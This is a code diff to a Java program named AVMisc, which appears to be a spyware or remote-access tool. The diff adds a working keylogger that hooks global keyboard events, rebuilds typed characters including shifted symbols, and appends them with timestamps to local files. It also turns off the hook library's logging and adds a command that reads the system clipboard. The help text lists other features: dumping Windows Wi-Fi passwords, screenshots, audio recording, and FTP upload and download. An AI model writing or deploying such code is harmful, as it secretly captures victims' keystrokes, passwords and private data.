@@ -4,6 +4,10 @@ import java.awt.AWTException;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
+import java.awt.datatransfer.Clipboard;
+import java.awt.datatransfer.DataFlavor;
+import java.awt.datatransfer.Transferable;
+import java.awt.datatransfer.UnsupportedFlavorException;
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
 import java.io.File;
@@ -13,13 +17,17 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Scanner;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 import java.util.stream.Collectors;
 
 import javax.imageio.ImageIO;
@@ -54,7 +62,10 @@ public class AVMisc implements NativeKeyListener {
 	private String playingAudioFileName;
 	private Audio audio;
 	private Recorder recorder;
-	private boolean KLIsPossible;
+	private boolean KLIsRunning = false;
+	private boolean shiftIsDown = false;
+	private Path klFilePath = Paths.get("file.txt");
+	private Path klLogFilePath = Paths.get("log.txt");
 
 	public static void main(String[] args) {
 		AVMisc av = new AVMisc();
@@ -65,20 +76,11 @@ public class AVMisc implements NativeKeyListener {
 		sc = new Scanner(System.in);
 		recordingAudio.set(false);
 		playingAudio.set(false);
-		try {
-			GlobalScreen.registerNativeHook();
-			KLIsPossible = true;
-		}
-		catch(NativeHookException e) {
-			KLIsPossible = false;
-		}
+		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+		logger.setLevel(Level.OFF);
+		logger.setUseParentHandlers(false);
 	}
 	
-	// Microphone
-	// Speakers
-	// Keyboard
-	// Wifi (check if os is windows)
-	// Screenshot
 	
 	private void begin() {
 		String command;
@@ -113,6 +115,9 @@ public class AVMisc implements NativeKeyListener {
 				case "wifi":
 					getWifiInfo();
 					break;
+				case "clipboard":
+					showClipboardContents();
+					break;
 				case "upload":
 					upload();
 					break;
@@ -124,6 +129,7 @@ public class AVMisc implements NativeKeyListener {
 					break;
 				case "quit":
 				case "exit":
+					if(KLIsRunning) { stopKeylogger(); }
 					System.exit(0);
 				default:
 					System.out.printf("'%s' is not a recognized command. Type 'help' for a list of available commands.\n", command);
@@ -269,14 +275,42 @@ public class AVMisc implements NativeKeyListener {
 	 * Start Keylogger
 	 */
 	private void startKeylogger() {
-		
+		if(KLIsRunning) {
+			System.out.println("Keylogger is already running");
+		}
+		else {
+			try {
+				GlobalScreen.registerNativeHook();
+				GlobalScreen.addNativeKeyListener(this);
+				
+				if(!Files.exists(klFilePath)) {
+					Files.createFile(klFilePath);
+				}
+				if(!Files.exists(klLogFilePath)) {
+					Files.createFile(klLogFilePath);
+				}
+				KLIsRunning = true;
+			}
+			catch(NativeHookException | IOException e) {
+				System.out.println(e.getMessage());
+				KLIsRunning = false;
+			}
+		}
 	}
 	
 	/***
 	 * Stop Keylogger
 	 */
 	private void stopKeylogger() {
-		
+		if(KLIsRunning) {
+			try {
+				GlobalScreen.unregisterNativeHook();
+				KLIsRunning = false;
+			}
+			catch(NativeHookException e) {
+				System.out.println(e.getMessage());
+			}
+		}
 	}
 	
 	/***
@@ -414,6 +448,25 @@ public class AVMisc implements NativeKeyListener {
 				}
 	}
 	
+	
+	/***
+	 * View clipboard contents
+	 */
+	private void showClipboardContents() {
+		Toolkit toolkit = Toolkit.getDefaultToolkit();
+		Clipboard clipboard = toolkit.getSystemClipboard();
+		try {
+			Transferable t = clipboard.getContents(null);
+			if(t.isDataFlavorSupported(DataFlavor.stringFlavor)) {
+				System.out.printf("String data: %s\n", t.getTransferData(DataFlavor.stringFlavor));
+			}
+		}
+		catch(UnsupportedFlavorException  | IOException e) {
+			System.out.println(e.getMessage());
+		}
+	}
+
+	
 	/***
 	 * Show Help
 	 */
@@ -428,12 +481,13 @@ public class AVMisc implements NativeKeyListener {
 				+ "\t'start_kl': Start the keylogger\n\n"
 				+ "\t'stop_kl': Stop the keylogger\n\n"
 				+ "\t'wifi': Get the passwords for the wireless profiles on the system(Windows only)\n\n"
+				+ "\t'clipboard': View the contents of the clipboard\n\n"
 				+ "\t'upload': Upload a file to the server\n\n"
 				+ "\t'download': Download a file from the server\n\n"
 				+ "\t'help': Show this help message\n";
 		System.out.println(helpMsg);
-		
 	}
+	
 	
 	/********** HELPER METHODS **********/
 	private boolean connectToFTPServer() {
@@ -466,20 +520,142 @@ public class AVMisc implements NativeKeyListener {
 		}
 	}
 
+	
+	/********** KEYBOARD EVENT HANDLERS **********/
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent event) {
-		
+		try {
+			String keyText = "";
+			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), LocalDateTime.now().toString());
+			switch(event.getKeyCode()) {
+				case NativeKeyEvent.VC_SPACE:
+					keyText = " ";
+					break;
+				case NativeKeyEvent.VC_ENTER:
+					keyText = "\n";
+					break;
+				case NativeKeyEvent.VC_TAB:
+					keyText = "\t";
+					break;
+				case NativeKeyEvent.VC_BACKQUOTE:
+					keyText = shiftIsDown ? "~" : "`";
+					break;
+				case NativeKeyEvent.VC_1:
+					keyText = shiftIsDown ? "!" : "1";
+					break;
+				case NativeKeyEvent.VC_2:
+					keyText = shiftIsDown ? "@" : "2";
+					break;
+				case NativeKeyEvent.VC_3:
+					keyText = shiftIsDown ? "#" : "3";
+					break;
+				case NativeKeyEvent.VC_4:
+					keyText = shiftIsDown ? "$" : "4";
+					break;
+				case NativeKeyEvent.VC_5:
+					keyText = shiftIsDown ? "%" : "5";
+					break;
+				case NativeKeyEvent.VC_6:
+					keyText = shiftIsDown ? "^" : "6";
+					break;
+				case NativeKeyEvent.VC_7:
+					keyText = shiftIsDown ? "&" : "7";
+					break;
+				case NativeKeyEvent.VC_8:
+					keyText = shiftIsDown ? "*" : "8";
+					break;
+				case NativeKeyEvent.VC_9:
+					keyText = shiftIsDown ? "(" : "9";
+					break;
+				case NativeKeyEvent.VC_0:
+					keyText = shiftIsDown ? ")" : "0";
+					break;
+				case NativeKeyEvent.VC_MINUS:
+					keyText = shiftIsDown ? "_" : "-";
+					break;
+				case NativeKeyEvent.VC_EQUALS:
+					keyText = shiftIsDown ? "+" : "=";
+					break;
+				case NativeKeyEvent.VC_OPEN_BRACKET:
+					keyText = shiftIsDown ? "{" : "[";
+					break;
+				case NativeKeyEvent.VC_CLOSE_BRACKET:
+					keyText = shiftIsDown ? "}" : "]";
+					break;
+				case NativeKeyEvent.VC_BACK_SLASH:
+					keyText = shiftIsDown ? "|" : "\\";
+					break;
+				case NativeKeyEvent.VC_SEMICOLON:
+					keyText = shiftIsDown ? ":" : ";";
+					break;
+				case NativeKeyEvent.VC_QUOTE:
+					keyText = shiftIsDown ? "\"" : "'";
+					break;
+				case NativeKeyEvent.VC_COMMA:
+					keyText = shiftIsDown ? "<" : ",";
+					break;
+				case NativeKeyEvent.VC_PERIOD:
+					keyText = shiftIsDown ? ">" : ".";
+					break;
+				case NativeKeyEvent.VC_SLASH:
+					keyText = shiftIsDown ? "?" : "/";
+					break;
+				case NativeKeyEvent.VC_A:
+				case NativeKeyEvent.VC_B:
+				case NativeKeyEvent.VC_C:
+				case NativeKeyEvent.VC_D:
+				case NativeKeyEvent.VC_E:
+				case NativeKeyEvent.VC_F:
+				case NativeKeyEvent.VC_G:
+				case NativeKeyEvent.VC_H:
+				case NativeKeyEvent.VC_I:
+				case NativeKeyEvent.VC_J:
+				case NativeKeyEvent.VC_K:
+				case NativeKeyEvent.VC_L:
+				case NativeKeyEvent.VC_M:
+				case NativeKeyEvent.VC_N:
+				case NativeKeyEvent.VC_O:
+				case NativeKeyEvent.VC_P:
+				case NativeKeyEvent.VC_Q:
+				case NativeKeyEvent.VC_R:
+				case NativeKeyEvent.VC_S:
+				case NativeKeyEvent.VC_T:
+				case NativeKeyEvent.VC_U:
+				case NativeKeyEvent.VC_V:
+				case NativeKeyEvent.VC_W:
+				case NativeKeyEvent.VC_X:
+				case NativeKeyEvent.VC_Y:
+				case NativeKeyEvent.VC_Z:
+					keyText = NativeKeyEvent.getKeyText(event.getKeyCode());
+					break;
+				default:
+					break;
+						
+			}
+			if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+				shiftIsDown = true;
+			}
+			Files.write(klFilePath, keyText.getBytes(), StandardOpenOption.APPEND);
+			Files.write(klLogFilePath, logKeyText.getBytes(), StandardOpenOption.APPEND);
+		}
+		catch (IOException e) {
+			System.out.println(e.getMessage());
+		}
 		
 	}
 
+	
 	@Override
 	public void nativeKeyReleased(NativeKeyEvent event) {
-		
-		
+		if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
+			shiftIsDown = false;
+		}
 	}
 
 	@Override
 	public void nativeKeyTyped(NativeKeyEvent event) {
 		
 	}
+
+
 }
